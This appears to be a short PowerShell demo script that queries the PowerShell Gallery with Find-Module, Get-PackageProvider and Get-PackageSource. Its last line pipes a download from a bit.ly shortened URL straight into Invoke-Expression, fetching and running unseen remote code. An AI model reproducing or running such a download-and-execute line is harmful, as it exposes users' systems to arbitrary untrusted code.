(Find-Module).count

Find-Module -Name *ise*

Find-Module | ? author -eq 'Ed Wilson'

Get-PackageProvider
Get-PackageSource

iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")